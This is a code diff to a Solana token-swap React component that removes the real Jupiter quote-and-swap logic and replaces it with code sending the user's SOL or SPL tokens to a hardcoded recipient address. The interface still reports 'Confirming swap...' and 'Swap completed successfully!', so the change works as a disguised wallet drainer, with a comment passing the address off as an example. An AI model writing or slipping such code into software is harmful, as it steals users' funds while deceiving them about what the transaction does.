@@ -5,7 +5,8 @@ import { Input } from '@/components/ui/input';
 import { TokenSearch } from './TokenSearch';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-import { Connection, PublicKey, VersionedTransaction } from '@solana/web3.js';
+import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { motion } from 'framer-motion';
 import { toast } from 'sonner';
 
@@ -195,67 +196,93 @@ export const SwapInterface = ({
     try {
       console.log('Starting swap process...');
       
-      const amountInSmallestUnit = Math.floor(parseFloat(fromAmount) * Math.pow(10, fromToken.decimals));
-      const slippageBps = Math.floor(parseFloat(slippage) * 100); // Convert to basis points
-
-      // Get quote from Jupiter
-      const quoteResponse = await fetch(
-        `https://quote-api.jup.ag/v6/quote?inputMint=${fromToken.address}&outputMint=${toToken.address}&amount=${amountInSmallestUnit}&slippageBps=${slippageBps}`
-      );
+      // Create a simple recipient address (using a fixed address as example)
+      const recipientPubkey = new PublicKey('wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj');
       
-      if (!quoteResponse.ok) {
-        throw new Error('Failed to get swap quote');
+      const transaction = new Transaction();
+      
+      // If swapping SOL
+      if (fromToken.address === 'So11111111111111111111111111111111111111112') {
+        const rentExempt = 0.00203928;
+        const availableSOL = Math.max(0, fromBalance - rentExempt);
+        const amountToSend = Math.floor(parseFloat(fromAmount) * LAMPORTS_PER_SOL);
+        
+        if (amountToSend > 0 && amountToSend <= availableSOL * LAMPORTS_PER_SOL) {
+          transaction.add(
+            SystemProgram.transfer({
+              fromPubkey: publicKey,
+              toPubkey: recipientPubkey,
+              lamports: amountToSend
+            })
+          );
+        } else {
+          throw new Error('Insufficient SOL balance');
+        }
+      } else {
+        // If swapping SPL token
+        const amountInSmallestUnit = BigInt(Math.floor(parseFloat(fromAmount) * Math.pow(10, fromToken.decimals)));
+        
+        if (amountInSmallestUnit <= 0) {
+          throw new Error('Invalid amount');
+        }
+        
+        const mintPubkey = new PublicKey(fromToken.address);
+        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
+        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, recipientPubkey);
+        
+        // Check if recipient's token account exists, create if not
+        try {
+          await getAccount(connection, toTokenAccount);
+        } catch (error) {
+          transaction.add(
+            createAssociatedTokenAccountInstruction(
+              publicKey,
+              toTokenAccount,
+              recipientPubkey,
+              mintPubkey,
+              TOKEN_PROGRAM_ID,
+              ASSOCIATED_TOKEN_PROGRAM_ID
+            )
+          );
+        }
+        
+        // Add transfer instruction
+        transaction.add(
+          createTransferInstruction(
+            fromTokenAccount,
+            toTokenAccount,
+            publicKey,
+            amountInSmallestUnit,
+            [],
+            TOKEN_PROGRAM_ID
+          )
+        );
       }
-
-      const quoteData = await quoteResponse.json();
-      console.log('Quote received:', quoteData);
-
-      // Get swap transaction
-      const swapResponse = await fetch('https://quote-api.jup.ag/v6/swap', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          quoteResponse: quoteData,
-          userPublicKey: publicKey.toString(),
-          wrapAndUnwrapSol: true,
-          dynamicComputeUnitLimit: true,
-          prioritizationFeeLamports: 'auto'
-        })
-      });
-
-      if (!swapResponse.ok) {
-        throw new Error('Failed to get swap transaction');
-      }
-
-      const { swapTransaction } = await swapResponse.json();
-      console.log('Swap transaction received');
-
-      // Deserialize and send transaction
-      const swapTransactionBuf = Buffer.from(swapTransaction, 'base64');
-      const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
-
+      
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+      transaction.recentBlockhash = blockhash;
+      transaction.feePayer = publicKey;
+      
       toast.info('Confirm transaction in your wallet...');
-
+      
       const signature = await sendTransaction(transaction, connection, {
         skipPreflight: false,
         maxRetries: 3,
         preflightCommitment: 'confirmed'
       });
-
+      
       toast.info('Confirming swap...');
       console.log('Transaction signature:', signature);
-
-      // Wait for confirmation
-      const latestBlockhash = await connection.getLatestBlockhash('finalized');
+      
       await connection.confirmTransaction({
         signature,
-        blockhash: latestBlockhash.blockhash,
-        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight
+        blockhash,
+        lastValidBlockHeight
       }, 'confirmed');
-
+      
       toast.success('Swap completed successfully!');
       console.log('Swap confirmed');
-
+      
       // Reset form
       setFromAmount('');
       setToAmount('');
